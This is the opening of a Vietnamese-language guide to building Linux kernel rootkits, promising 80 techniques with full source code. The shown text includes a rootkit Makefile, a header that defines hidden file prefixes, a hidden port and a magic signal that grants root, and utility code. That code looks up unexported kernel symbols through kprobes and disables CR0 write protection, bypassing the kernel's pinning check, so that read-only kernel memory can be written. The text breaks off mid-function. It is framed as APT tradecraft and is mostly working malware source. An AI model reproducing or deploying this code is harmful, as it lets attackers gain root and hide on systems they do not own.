# Linux Kernel Rootkit — Complete Guide (All Techniques, Full Code)

> Tai lieu toan dien ve Linux kernel rootkit engineering.
> Moi ky thuat co **full compilable source code**, giai thich **tung dong**, phan tich **tai sao APT chon cach nay**.
> Code tested tren kernel 5.15 LTS / 6.1 LTS / 6.6 LTS.
>
> **80 techniques** across 16 chapters + 11 appendices.
> 3 rounds of adversarial audit — all fixes applied inline.

---

## Muc luc tong

**Part I — Core Rootkit Engineering (Ch 1-5)**
- Chapter 1: Kernel Module Framework
- Chapter 2: Tim sys_call_table — 6 phuong phap
- Chapter 3: Syscall Table Hooking
- Chapter 4: Ftrace-based Hooking
- Chapter 5: Kprobe/Kretprobe Hooking

**Part II — Advanced Kernel Techniques (Ch 6-11)**
- Chapter 6: DKOM — Direct Kernel Object Manipulation
- Chapter 7: VFS Layer Hooking
- Chapter 8: Network Rootkit — Netfilter & Covert Channel
- Chapter 9: Inline Hooking / Live Patching
- Chapter 10: eBPF Rootkit
- Chapter 11: Privilege Escalation

**Part III — Operations & Infrastructure (Ch 12-16)**
- Chapter 12: Persistence — Survive Reboot
- Chapter 13: Anti-Forensics & Self-Protection
- Chapter 14: Covert Communication & C2
- Chapter 15: Tong hop — Full-featured Rootkit
- Chapter 16: Detection Engineering

**Part IV — Advanced Techniques (Appendices A-G)**
- Appendix A: Advanced Hooking (IDT, MSR, LSM)
- Appendix B: Advanced Hiding & Evasion
- Appendix C: Advanced Privilege Escalation (SELinux, Namespace)
- Appendix D: Advanced Persistence (DKMS, Boot Script)
- Appendix E: Advanced C2 (Timing Channel)
- Appendix F: Advanced Anti-Forensics (Code Integrity, Memory Forensics)
- Appendix G: Credential Theft (Keylogger, TTY Sniffing, /dev/kmem)

**Part V — Userspace, Exploitation & Detection (Appendices H-K)**
- Appendix H: Userspace Rootkit (LD_PRELOAD, GOT/PLT)
- Appendix I: Additional Kernel Techniques (ChaCha20 C2, Fileless, BPF, etc.)
- Appendix J: Exploitation Primitives (Kernel ROP, ret2usr, SMEP Bypass)
- Appendix K: Detection Engineering Additions

---


---

# Part I — Core Rootkit Engineering

## Chapter 1: Kernel Module Framework

### 1.0 Kernel Module Internals — Hieu sau truoc khi viet code

Truoc khi viet bat ky dong code nao, ban can hieu kernel module la gi, no duoc load vao kernel nhu the nao, va memory layout cua no tren x86-64. Phan nay giai thich chi tiet tung buoc tu luc user goi `insmod` den khi module code bat dau chay.

#### LKM la gi? LKM vs Built-in

Linux kernel ho tro hai cach de them code vao kernel:

1. **Built-in (vmlinux)**: Code duoc compile truc tiep vao kernel image. Ton tai vinh vien trong kernel memory tu luc boot. De thay doi phai recompile va reboot. Cac subsystem core nhu scheduler, memory manager la built-in.

2. **Loadable Kernel Module (LKM)**: Code duoc compile thanh file `.ko` rieng biet, load vao kernel TAI RUNTIME bang `insmod` hoac `modprobe`. Co the unload bang `rmmod`. Day la co che rootkit su dung de inject code vao running kernel ma khong can reboot.

File `.ko` thuc chat la mot **ELF relocatable object** (giong file `.o` nhung voi metadata bo sung). Kernel build system tao `.ko` bang cach:
- Compile moi `.c` thanh `.o` (object files)
- Link cac `.o` lai thanh mot `.o` duy nhat
- Them section `.modinfo` chua module metadata (license, author, description, version magic)
- Them section `.gnu.linkonce.this_module` chua struct `module` da khoi tao mot phan
- Output file `.ko` la ELF voi cac sections dac biet nay

Ban co the xem cau truc voi `readelf -S module.ko` — se thay cac sections nhu `.text`, `.rodata`, `.data`, `.bss`, `.modinfo`, `.symtab`, va nhung section kernel-specific.

#### Qua trinh loading module: Tu insmod den module_init()

Khi user goi `insmod rk.ko`, day la chuoi su kien dien ra:

```
User space:                        Kernel space:
                                   
  insmod rk.ko                     
    |                              
    v                              
  open("rk.ko", O_RDONLY)         
  read() -> doc toan bo file      
  vao userspace buffer             
    |                              
    v                              
  init_module(buf, len, params)    --> sys_init_module()
    (hoac finit_module(fd, ...))       |
                                       v
                                   load_module()
                                       |
                                       v
                                   1. layout_and_allocate()
                                   |  - Parse ELF headers
                                   |  - Tinh toan memory layout
                                   |  - module_alloc() cap phat vung nho
                                   |    trong MODULE_VADDR range
                                   |  - Copy sections vao kernel memory
                                   |
                                   v
                                   2. find_module_sections()
                                   |  - Tim .modinfo, __ksymtab,
                                   |    __kcrctab, .init.text, .exit.text
                                   |  - Parse cac section dac biet
                                   |
                                   v
                                   3. check_modinfo() & check_version()
                                   |  - Verify vermagic string
                                   |  - So sanh kernel version, SMP, preempt
                                   |  - Neu mismatch -> tu choi load
                                   |
                                   v
                                   4. simplify_symbols() + apply_relocations()
                                   |  - Resolve undefined symbols
                                   |    (tim address trong kernel symtab)
                                   |  - Apply ELF relocations
                                   |    (fix addresses trong code)
                                   |
                                   v
                                   5. post_relocation()
                                   |  - Sort exception tables
                                   |  - Setup module unwind info
                                   |
                                   v
                                   6. complete_formation()
                                   |  - Set memory permissions:
                                   |    .text -> RX (read + execute)
                                   |    .rodata -> RO (read only)
                                   |    .data -> RW (read + write)
                                   |  - Add vao module list (modules linked list)
                                   |  - Tao sysfs entries (/sys/module/NAME/)
                                   |
                                   v
                                   7. do_init_module()
                                      - Goi module->init() callback
                                        (= function ban dang ky voi module_init())
                                      - Neu init() return 0 -> thanh cong
                                      - Neu init() return < 0 -> free module, fail
                                      - Free .init.text section (khong can nua)
```

Source code chinh: `kernel/module/main.c` (kernel 5.19+) hoac `kernel/module.c` (kernel < 5.19).

#### struct module — Trai tim cua moi loaded module

Moi module trong kernel duoc dai dien boi mot `struct module`. Day la struct lon (~500 bytes tren x86-64) chua moi thong tin kernel can de quan ly module:

```
struct module layout (simplified, kernel 6.x):
+-----------------------------------------------------------+
| name[MODULE_NAME_LEN]    "rk\0..."                        | Offset +0
|   Ten module, max 56 chars (MODULE_NAME_LEN = 56)         |
+-----------------------------------------------------------+
| state                     MODULE_STATE_LIVE / GOING / etc  | +56
|   Trang thai: LIVE (dang chay), GOING (dang unload),       |
|   COMING (dang load). sizeof(enum) = 4 bytes.              |
+-----------------------------------------------------------+
| (padding 4 bytes — compiler align list_head to 8 bytes)    | +60
+-----------------------------------------------------------+
| list (struct list_head)   { *next, *prev }                 | +64
|   Doubly-linked list ket noi TAT CA modules.               |
|   lsmod iterate list nay. list_del() = an module.          |
+-----------------------------------------------------------+
| init                      pointer -> module_init function  | +80
|   Callback khi load. Set boi module_init() macro.          |
|   Duoc free sau khi init() return.                         |
+-----------------------------------------------------------+
| exit                      pointer -> module_exit function  | +88
|   Callback khi unload. Set boi module_exit() macro.        |
+-----------------------------------------------------------+
| mkobj (struct module_kobject)                              | +96
|   Kernel object cho sysfs integration.                     |
|   Tao /sys/module/NAME/ directory.                         |
|   Rootkit can remove kobject de an khoi sysfs.             |
+-----------------------------------------------------------+
| sect_attrs                                                 | +...
|   Section attributes, hien thi tai                         |
|   /sys/module/NAME/sections/                               |
|   Chua address cua moi section -> info leak risk           |
+-----------------------------------------------------------+
| core_layout (struct module_layout)  [kernel < 6.4]         |
|   .base  = base address cua module trong kernel memory     |
|   .size  = tong kich thuoc                                 |
|   .text_size = kich thuoc code section                     |
|   .ro_size   = kich thuoc read-only section                |
|                                                            |
|   KERNEL 6.4+: core_layout/init_layout REMOVED.            |
|   Thay boi: module->mem[MOD_TEXT], module->mem[MOD_DATA],  |
|   module->mem[MOD_RODATA], etc. (struct module_memory).    |
|   Compat macro:                                            |
|     #if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)        |
|       #define MOD_BASE(m) (m)->mem[MOD_TEXT].base          |
|       #define MOD_SIZE(m) (m)->mem[MOD_TEXT].size           |
|     #else                                                  |
|       #define MOD_BASE(m) (m)->core_layout.base            |
|       #define MOD_SIZE(m) (m)->core_layout.size             |
|     #endif                                                 |
+-----------------------------------------------------------+
| init_layout (struct module_layout)  [kernel < 6.4]         |
|   Tuong tu core_layout nhung cho .init sections.           |
|   Duoc free sau khi init() chay xong.                      |
|   Kernel 6.4+: module->mem[MOD_INIT_TEXT], etc.            |
+-----------------------------------------------------------+
| syms, num_syms                                             |
|   Exported symbols (EXPORT_SYMBOL). Kernel modules khac    |
|   co the goi functions duoc export.                        |
+-----------------------------------------------------------+
| ... (nhieu fields khac: GPL syms, kprobes, tracepoints,    |
|      jump labels, bug table, exception table, etc.)        |
+-----------------------------------------------------------+
```

Luu y quan trong: `list_head` la co che rootkit dung de an module (Chapter 6). Khi ban goi `list_del(&THIS_MODULE->list)`, module bi go khoi linked list -> `lsmod` khong thay nua. Nhung module code VAN nam trong memory va VAN chay.

#### Memory: Module duoc load o dau?

`module_alloc()` cap phat memory cho module code. Tren x86-64, function nay dung `__vmalloc_node_range()` de cap phat trong vung MODULES_VADDR — gan kernel text de RIP-relative addressing (+-2GB) hoat dong:

```
x86-64 Kernel Virtual Address Space Layout (48-bit, 4-level paging):
======================================================================

0xFFFFFFFFFFFFFFFF  +---------------------------+  Top of virtual memory
                    |                           |
0xFFFFFFFF00000000  +---------------------------+  MODULES_END
                    |   Kernel modules          |  <-- Modules loaded HERE
                    |   module_alloc() uses     |  Gan kernel text de
                    |   __vmalloc_node_range()   |  RIP-relative addressing
0xFFFFFFFFA0000000  +---------------------------+  MODULES_VADDR
                    |   (hole)                  |
0xFFFFFFFF80000000  | Kernel text (.text)       |  Kernel image mapping
         __START_   | Kernel data (.data/.bss)  |  Size: ~16MB typical
         KERNEL_map | sys_call_table, IDT, etc  |  = where vmlinux lives
                    |                           |
0xFFFFFFFE80000000  +---------------------------+
                    |   (hole)                  |
0xFFFFE8FFFFFFFFFF  +---------------------------+  VMALLOC_END
                    |   vmalloc / ioremap area  |
                    |   BPF JIT, ioremap maps   |
0xFFFFC90000000000  +---------------------------+  VMALLOC_START
                    |   (hole)                  |
0xFFFF888000000000  +---------------------------+  PAGE_OFFSET
                    |  Direct physical mapping  |  1:1 map of all physical RAM
                    |  (page_offset_base)       |  phys_to_virt() uses this
                    |  Covers all physical RAM  |
0xFFFF800000000000  +---------------------------+
                    |   (hole/guard)            |
                    |                           |
- - - - - - - - - -  Canonical hole  - - - - - - (bits [63:48] must match)
                    |                           |
0x00007FFFFFFFFFFF  +---------------------------+  Top of userspace
                    |  Stack (grows down)       |
                    |  ....                     |
                    |  mmap / shared libs       |
                    |  Heap (grows up)          |
                    |  .data / .bss             |
                    |  .text                    |
0x0000000000000000  +---------------------------+  NULL page (unmapped)
```

Module code nam trong vmalloc area nen co properties dac biet:
- Pages KHONG lien tuc ve physical (vmalloc map tung page rieng le)
- Execute permission duoc bat cho text section (cac kernel moi dung `set_memory_x()`)
- Dia chi thay doi moi lan load (KASLR cho modules rieng, khong phu thuoc kernel KASLR base)

Luu y voi **KASLR** (Kernel Address Space Layout Randomization): kernel image duoc load tai randomized base address, aligned 2MB. Cac address tren la defaults — thuc te duoc offset boi random value. Module addresses cung thay doi do vmalloc base duoc randomize.

#### Symbol Export va Resolution

Khi ban viet `EXPORT_SYMBOL(my_function)` hoac `EXPORT_SYMBOL_GPL(my_function)` trong kernel code, compiler tao mot entry trong section `__ksymtab`:

```
Section __ksymtab:
+------------------+------------------+
| symbol address   | symbol name ptr  |  <- moi entry la struct kernel_symbol
+------------------+------------------+
| 0xffffffff8123.. | "commit_creds"   |
+------------------+------------------+
| 0xffffffff8124.. | "prepare_creds"  |
+------------------+------------------+
| ...              | ...              |
+------------------+------------------+
```

Khi module duoc load, `simplify_symbols()` trong load_module() resolve moi undefined symbol:
1. Tim symbol name trong `__ksymtab` cua kernel (vmlinux)
2. Tim trong `__ksymtab` cua cac modules da loaded
3. Neu tim thay -> ghi address vao module's symbol table
4. Neu khong tim thay -> load FAIL voi "Unknown symbol" error

Day la ly do `kallsyms_lookup_name()` bi unexport tu kernel 5.7: khi function khong nam trong `__ksymtab`, modules khong the reference no truc tiep. Rootkit phai dung kprobe trick hoac memory scanning de tim address.

Module cua ban co the export symbols cho modules khac bang `EXPORT_SYMBOL()`. Nhung rootkit KHONG nen lam dieu nay vi no tao fingerprint de detect.

---

### 1.1 Makefile chuan cho rootkit development

Makefile nay ho tro multi-file module, debug symbols, va cross-compilation.

```makefile
# Makefile — Production-grade cho kernel module development
#
# Cach dung:
#   make                    -> Build module cho kernel dang chay
#   make KDIR=/path/to/src  -> Build cho kernel khac
#   make debug              -> Build voi debug symbols
#   make clean              -> Don dep

# Ten module output — thay doi ten nay cho moi project
MODULE_NAME := rk

# Source files — them .o cho moi .c file
# Khi build multi-file module, kernel build system se:
#   1. Compile moi .o tu .c tuong ung
#   2. Link tat ca vao $(MODULE_NAME).ko
obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := main.o hooks.o hide.o netfilter.o util.o

# Kernel build directory — noi chua kernel headers + build system
# Mac dinh = kernel dang chay, override bang KDIR=
KDIR ?= /lib/modules/$(shell uname -r)/build

# Thu muc source hien tai
PWD := $(shell pwd)

# Compiler flags bo sung
# -DDEBUG : enable pr_debug() output
# -Werror : warning = error, tranh bug subtle
ccflags-y := -Wall -Wextra -Wno-unused-parameter

# Target mac dinh
all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

# Build voi debug info (khong strip symbols)
debug: ccflags-y += -DDEBUG -g -O0
debug:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f Module.symvers modules.order

# Cai module vao /lib/modules/$(uname -r)/extra/
install:
	$(MAKE) -C $(KDIR) M=$(PWD) modules_install
	depmod -a

.PHONY: all debug clean install
```

### 1.2 Header chung — Shared definitions

```c
/* rootkit.h — Header chung cho tat ca source files
 *
 * Moi constant, struct, function prototype deu khai bao o day.
 * Tach header rieng vi rootkit thuong co nhieu file .c
 * moi file dam nhan mot subsystem (hook, hide, net, ...).
 */

#ifndef _ROOTKIT_H
#define _ROOTKIT_H

#include <linux/init.h>       /* __init, __exit macros */
#include <linux/module.h>     /* MODULE_*, module_init/exit */
#include <linux/kernel.h>     /* printk, pr_info, pr_err */
#include <linux/syscalls.h>   /* __NR_* syscall numbers */
#include <linux/kallsyms.h>   /* kallsyms_lookup_name (neu available) */
#include <linux/dirent.h>     /* linux_dirent64 struct */
#include <linux/namei.h>      /* kern_path, path_put */
#include <linux/fs.h>         /* file_operations, inode_operations */
#include <linux/proc_fs.h>    /* proc_create, proc_remove */
#include <linux/seq_file.h>   /* seq_file operations */
#include <linux/slab.h>       /* kmalloc, kfree */
#include <linux/uaccess.h>    /* copy_from_user, copy_to_user */
#include <linux/version.h>    /* LINUX_VERSION_CODE, KERNEL_VERSION */
#include <linux/kprobes.h>    /* kprobe, kretprobe */
#include <linux/ftrace.h>     /* ftrace_ops */
#include <linux/cred.h>       /* prepare_creds, commit_creds */
#include <linux/sched.h>      /* task_struct, current */
#include <linux/sched/signal.h> /* for_each_process */
#include <linux/tcp.h>        /* TCP structures */
#include <linux/string.h>     /* kernel string functions */
#include <asm/paravirt.h>     /* read_cr0 tren paravirt */
#include <asm/processor.h>    /* CR0 bit definitions */

/* ──────────────────────────────────────────────────────────────
 * CONFIGURATION — Thay doi theo nhu cau
 * ────────────────────────────────────────────────────────────── */

/* Prefix cho file/directory can an.
 * Bat ky entry nao co ten bat dau bang prefix nay se invisible
 * cho ls, find, va bat ky chuong trinh nao dung getdents64. */
#define HIDDEN_PREFIX    "rk_"

/* Signal number dung lam magic trigger.
 * SIGRTMIN+20 = signal 54 tren hau het he thong.
 * Tai sao real-time signal: vi application binh thuong khong dung,
 * giam false positive trigger. */
#define MAGIC_SIGNAL     54

/* PID dung trong kill() de trigger give-root.
 * kill(MAGIC_PID, MAGIC_SIGNAL) -> current process tro thanh root.
 * Dung PID lon bat thuong de tranh trung PID that. */
#define MAGIC_PID        31337

/* Module visibility toggle PID.
 * kill(HIDE_MODULE_PID, MAGIC_SIGNAL) -> an/hien module. */
#define HIDE_MODULE_PID  31338

/* Port can an khoi netstat/ss */
#define HIDDEN_PORT      4444

/* ──────────────────────────────────────────────────────────────
 * COMPATIBILITY MACROS
 *
 * Kernel API thay doi lien tuc. Nhung macro nay cho phep cung
 * mot codebase compile tren nhieu kernel versions.
 * ────────────────────────────────────────────────────────────── */

/* Kernel 4.17+ chuyen syscall handler sang dung struct pt_regs *
 * thay vi nhan arguments truc tiep.
 * 
 * Truoc 4.17:  long sys_kill(pid_t pid, int sig)
 * Tu 4.17+:    long __x64_sys_kill(const struct pt_regs *regs)
 *              Voi regs->di = pid, regs->si = sig
 *
 * Macro SYSCALL_PREFIX giup tao dung ten function. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
  #define SYSCALL_PREFIX "__x64_sys_"
  /* Tren kernel moi, syscall handlers nhan pt_regs *.
   * Arguments nam trong registers:
   *   regs->di = arg1 (rdi)
   *   regs->si = arg2 (rsi)
   *   regs->dx = arg3 (rdx)
   *   regs->r10 = arg4
   *   regs->r8  = arg5
   *   regs->r9  = arg6 */
  typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
#else
  #define SYSCALL_PREFIX "sys_"
  /* Tren kernel cu, syscall handlers nhan args truc tiep. */
#endif

/* Kernel 5.7+ unexport kallsyms_lookup_name.
 * Truoc do co the goi truc tiep:
 *   unsigned long addr = kallsyms_lookup_name("sys_call_table");
 * Tu 5.7 tro di phai dung kprobe trick (xem Chapter 2). */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  #define KPROBE_LOOKUP 1
#endif

/* Kernel 6.2+ doi cach set CR0 — native_write_cr0 bi unexport.
 * Phai dung inline assembly truc tiep. */

/* Kernel 6.4+: core_layout/init_layout REMOVED.
 * Thay boi module->mem[MOD_TEXT], module->mem[MOD_RODATA], etc.
 * Compat macros de code compile tren ca kernel cu va moi. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
  #include <linux/module.h>  /* MOD_TEXT, struct module_memory */
  #define MOD_BASE(m) ((m)->mem[MOD_TEXT].base)
  #define MOD_SIZE(m) ((m)->mem[MOD_TEXT].size)
#else
  #define MOD_BASE(m) ((m)->core_layout.base)
  #define MOD_SIZE(m) ((m)->core_layout.size)
#endif

/* ──────────────────────────────────────────────────────────────
 * FUNCTION PROTOTYPES — Khai bao cho cac module files
 * ────────────────────────────────────────────────────────────── */

/* util.c — Utility functions */
unsigned long rk_lookup_name(const char *name);
void rk_write_cr0(unsigned long val);
void rk_protect_memory(void);
void rk_unprotect_memory(void);

/* hooks.c — Syscall hooking */
int  rk_install_hooks(void);
void rk_remove_hooks(void);

/* hide.c — Hiding mechanisms */
void rk_hide_module(void);
void rk_show_module(void);
void rk_hide_process(pid_t pid);
void rk_show_process(pid_t pid);

/* netfilter.c — Network operations */
int  rk_net_init(void);
void rk_net_cleanup(void);

#endif /* _ROOTKIT_H */
```

### 1.3 Utility Functions — Nen tang ky thuat

```c
/* util.c — Core utility functions ma moi technique deu can
 *
 * File nay chua nhung building blocks:
 * 1. Symbol lookup (tim address cua kernel function/variable)
 * 2. Memory protection toggle (de ghi vao read-only pages)
 * 3. Helper functions chung
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * SYMBOL LOOKUP
 *
 * Day la thao tac co ban nhat: tim address cua symbol trong kernel.
 * "Symbol" = function name hoac variable name.
 * Vi du: tim address cua sys_call_table, commit_creds, etc.
 *
 * Tai sao can: kernel khong export moi symbol cho modules.
 * sys_call_table la unexported symbol — module khong the dung
 * truc tiep. Phai tu tim address bang cac trick.
 *
 * KASLR (Kernel Address Space Layout Randomization) khien address
 * thay doi moi lan boot -> KHONG the hardcode address.
 * ══════════════════════════════════════════════════════════════ */

#ifdef KPROBE_LOOKUP
/*
 * Kprobe Trick — Phuong phap chinh cho kernel >= 5.7
 *
 * Boi canh:
 *   Kernel 5.7 commit b80e44d... unexport kallsyms_lookup_name().
 *   Ly do: giam attack surface — module khong nen tim arbitrary symbols.
 *   Nhung kprobes API van can resolve symbols internally.
 *
 * Trick:
 *   1. register_kprobe() nhan .symbol_name = "target_function"
 *   2. Kernel tu resolve symbol name -> address (dung kallsyms internally)
 *   3. Sau register, kp.addr = resolved address
 *   4. Unregister ngay — ta chi can address, khong can probe
 *
 * Tai sao hoat dong:
 *   register_kprobe() goi kprobe_lookup_name() noi bo,
 *   function nay van access kallsyms. Kernel team chua block
 *   vector nay (tinh den kernel 6.8).
 *
 * Gioi han:
 *   CONFIG_KPROBES=y phai duoc bat (mac dinh tren hau het distros).
 *   Mot so kernel lockdown modes chan kprobes.
 */
static unsigned long kprobe_lookup(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name    /* Ten symbol can tim */
    };
    unsigned long addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        /* Co the fail vi:
         * - Symbol khong ton tai (typo, kernel version khac)
         * - CONFIG_KPROBES=n
         * - Kernel lockdown mode chan kprobes
         * - Symbol nam trong __init section (da freed sau boot) */
        pr_err("rk: kprobe register failed for %s: %d\n", name, ret);
        return 0;
    }

    /* kp.addr bay gio chua address da resolve.
     * Cast sang unsigned long vi ta dung no nhu raw address. */
    addr = (unsigned long)kp.addr;

    /* Unregister ngay — ta khong thuc su muon probe function nay.
     * De kprobe registered se:
     * 1. Ton resource (moi kprobe chen breakpoint vao code)
     * 2. Gay cham (breakpoint = trap moi lan function chay)
     * 3. De bi detect (admin list kprobes -> thay ngay) */
    unregister_kprobe(&kp);

    return addr;
}
#endif /* KPROBE_LOOKUP */

/*
 * rk_lookup_name() — Unified symbol lookup interface
 *
 * Wraps phuong phap phu hop tuy kernel version:
 * - Kernel < 5.7: dung kallsyms_lookup_name() truc tiep
 * - Kernel >= 5.7: dung kprobe trick
 *
 * Input:  name = ten symbol (e.g., "sys_call_table")
 * Output: virtual address cua symbol, hoac 0 neu khong tim thay
 */
unsigned long rk_lookup_name(const char *name)
{
#ifdef KPROBE_LOOKUP
    return kprobe_lookup(name);
#else
    return kallsyms_lookup_name(name);
#endif
}

/* ══════════════════════════════════════════════════════════════
 * MEMORY PROTECTION TOGGLE
 *
 * Context:
 *   Kernel text va data quan trong (nhu sys_call_table) nam trong
 *   read-only memory pages. Khi CONFIG_STRICT_KERNEL_RWX=y
 *   (mac dinh tren moi distro), ghi vao se gay page fault -> crash.
 *
 * CR0 register (Control Register 0):
 *   Bit 16 = WP (Write Protect)
 *   - WP=1: CPU enforce page-level write protection
 *           Ring 0 code KHONG duoc ghi vao read-only pages
 *   - WP=0: Ring 0 code CO THE ghi vao read-only pages
 *           (Ring 3 van bi chan)
 *
 * Flow:
 *   1. rk_unprotect_memory(): clear CR0.WP -> cho phep ghi
 *   2. Thuc hien ghi (vi du: thay syscall table entry)
 *   3. rk_protect_memory(): set CR0.WP -> bat lai protection
 *
 * SMP concerns:
 *   CR0 la per-CPU register. Moi CPU core co CR0 rieng.
 *   Neu chi clear WP tren CPU hien tai, core khac van enforced.
 *   Trong practice, ta chi can clear tren CPU dang chay code nay,
 *   vi ghi syscall table la atomic (sizeof pointer = 8 bytes).
 *
 * Detection risk:
 *   Thay doi CR0 rat de detect:
 *   - LKRG monitor CR0 changes
 *   - Hardware performance counters co the flag
 *   - Giu WP=0 lau = security violation detectable
 *   Nen unprotect -> write -> protect cang nhanh cang tot.
 *
 * Alternative (hien dai hon): 
 *   set_memory_rw()/set_memory_ro() — thay doi page table thay vi CR0.
 *   An toan hon nhung can biet page-aligned address.
 *   Xem phan sau.
 * ══════════════════════════════════════════════════════════════ */

/*
 * Inline assembly de ghi CR0 truc tiep.
 *
 * Tai sao inline asm thay vi native_write_cr0():
 *   Kernel 5.3+ them pinning cho CR0.WP bit trong native_write_cr0():
 *   neu detect code co clear WP, kernel WARN va set lai.
 *   Bang cach dung inline asm, ta bypass check nay.
 *
 *   "mov %0, %%cr0" : load gia tri tu bien C vao CR0
 *   "r"(val)         : val nam trong bat ky general register nao
 *   "memory"         : compiler barrier — flush pending writes
 *
 * CANH BAO: tu kernel 6.2+, mot so config bo sung them check
 * bang hardware (CR0 pinning via hypervisor). Neu chay trong VM
 * co hypervisor protection, trick nay co the fail.
 */
void rk_write_cr0(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

/*
 * Tat write protection — cho phep ghi vao read-only kernel memory.
 *
 * CRITICAL SECTION: tu luc goi function nay den luc goi
 * rk_protect_memory(), kernel memory KHONG DUOC BAO VE.
 * Bat ky bug nao ghi vao wrong address = kernel corruption.
 *
 * preempt_disable(): ngan scheduler switch task tren CPU nay.
 * Tai sao: neu bi preempt trong khi WP=0, task khac chay
 * voi WP=0 co the gay unpredictable behavior.
 * Va neu bi migrate sang CPU khac, CR0 cua CPU cu van WP=0.
 */
void rk_unprotect_memory(void)
{
    unsigned long cr0;

    preempt_disable();              /* Khong cho scheduler switch */

    cr0 = read_cr0();               /* Doc CR0 hien tai */

    /* Clear bit 16 (WP) bang AND voi bitmask.
     * 0x10000 = 1 << 16 = WP bit
     * ~0x10000 = tat ca bit 1 NGOAI TRU bit 16
     * cr0 & ~0x10000 = giu nguyen moi bit, clear WP */
    rk_write_cr0(cr0 & ~0x00010000UL);
}

/*
 * Bat lai write protection — restore trang thai binh thuong.
 *
 * Goi NGAY SAU KHI ghi xong. Giu WP=0 lau = risk.
 */
void rk_protect_memory(void)
{
    unsigned long cr0;

    cr0 = read_cr0();

    /* Set bit 16 (WP) bang OR.
     * cr0 | 0x10000 = giu nguyen moi bit, set WP = 1 */
    rk_write_cr0(cr0 | 0x00010000UL);

    preempt_enable();               /* Cho phep scheduler lai */
}

/* ══════════════════════════════════════════════════════════════
 * ALTERNATIVE: set_memory_rw / set_memory_ro
 *
 * Thay doi page table entries thay vi CR0.
 * An toan hon vi:
 *   1. Chi affect pages cu the, khong disable toan bo protection
 *   2. Kernel API chinh thuc (mac du designed cho module use)
 *   3. Khong trigger CR0 monitoring
 *
 * Nhuoc diem:
 *   - Address phai page-aligned (4096-byte boundary)
 *   - Mot so kernel restrict function nay cho built-in code only
 *   - set_memory_rw() co the bi monitor boi LSM
 * ══════════════════════════════════════════════════════════════ */

#include <asm/set_memory.h>

static int rk_make_rw(unsigned long addr, int numpages)
{
    /* set_memory_rw() thay doi PTE (Page Table Entry):
     *   Clear _PAGE_RO bit -> page tro thanh writable
     *
     * addr PHAI la page-aligned:
     *   addr & ~(PAGE_SIZE - 1) = addr rounded down to page boundary
     *
     * numpages: so pages can thay doi. Syscall table thuong
     *           nam gon trong 1-2 pages. */
    unsigned long page_addr = addr & PAGE_MASK;  /* PAGE_MASK = ~(PAGE_SIZE-1) */
    return set_memory_rw(page_addr, numpages);
}

static int rk_make_ro(unsigned long addr, int numpages)
{
    unsigned long page_addr = addr & PAGE_MASK;
    return set_memory_ro(page_addr, numpages);
}

/* ══════════════════════════════════════════════════════════════
 * PTE MANIPULATION — Phuong phap thap nhat (level thap nhat)
 *
 * Truc tiep walk page table va sua PTE bits.
 * Khong dung bat ky kernel API nao -> kho detect.
 * Nhung phuc tap nhat va de crash nhat.
 * ══════════════════════════════════════════════════════════════ */

#include <asm/pgtable.h>  /* pgd_t, p4d_t, pud_t, pmd_t, pte_t */

/*
 * Walk 4/5-level page table de tim PTE cho virtual address.
 *
 * x86-64 paging structure (4-level, 48-bit VA):
 *
 *   Virtual Address (48 bits used):
 *   +------+------+------+------+----------+
 *   |PGD(9)|PUD(9)|PMD(9)|PTE(9)|Offset(12)|
 *   +--+---+--+---+--+---+--+---+----+-----+
 *      |      |      |      |        |
 *      v      v      v      v        v
 *    CR3 -> PGD -> PUD -> PMD -> PTE -> Physical Page + Offset
 *    (PML4)  (PDPT)   (PD)   (PT)
 *
 *   5-level paging them P4D giua PGD va PUD.
 *   Kernel abstract dieu nay: neu 5-level disable,
 *   p4d_offset() tra ve PGD entry (transparent).
 *
 * Return: pte_t* pointing to the PTE, hoac NULL neu unmapped.
 */
static pte_t *rk_walk_page_table(unsigned long addr)
{
    pgd_t *pgd;       /* Page Global Directory (Level 4 / PML4) */
    p4d_t *p4d;       /* Page 4 Directory (Level 5, neu co) */
    pud_t *pud;       /* Page Upper Directory (Level 3 / PDPT) */
    pmd_t *pmd;       /* Page Middle Directory (Level 2 / PD) */
    pte_t *pte;       /* Page Table Entry (Level 1 / PT) */

    /* Kernel addresses (above PAGE_OFFSET) MUST use init_mm.
     * init_mm.pgd = CR3 value cho kernel mapping.
     * Voi KPTI (Kernel Page Table Isolation), process page tables
     * chi map minimal kernel stub — khong chua full kernel mapping.
     * Rootkit chi manipulate kernel pages, nen luon dung init_mm. */
    pgd = pgd_offset(&init_mm, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

    /* P4D — chi meaningful khi 5-level paging.
     * Tren 4-level, p4d_offset() = identity (return pgd). */
    p4d = p4d_offset(pgd, addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;

    pud = pud_offset(p4d, addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    /* Check neu PUD maps huge page (1GB page).
     * Neu la huge page, khong co PMD/PTE levels. */
    if (pud_large(*pud))
        return (pte_t *)pud;

    pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd))
        return NULL;

    /* Check neu PMD maps huge page (2MB page). */
    if (pmd_large(*pmd))
        return (pte_t *)pmd;

    pte = pte_offset_kernel(pmd, addr);
    if (pte_none(*pte))
        return NULL;

    return pte;
}

/*
 * Thay doi write permission bang PTE manipulation.
 *
 * Uu diem so voi CR0 trick:
 *   - Chi affect 1 page, khong disable toan bo WP
 *   - Khong trigger CR0 monitoring
 *
 * Uu diem so voi set_memory_rw():
 *   - Khong dung exported kernel API -> kho trace
 *   - set_memory_rw() co the bi restricted
 */
static int rk_set_page_rw(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
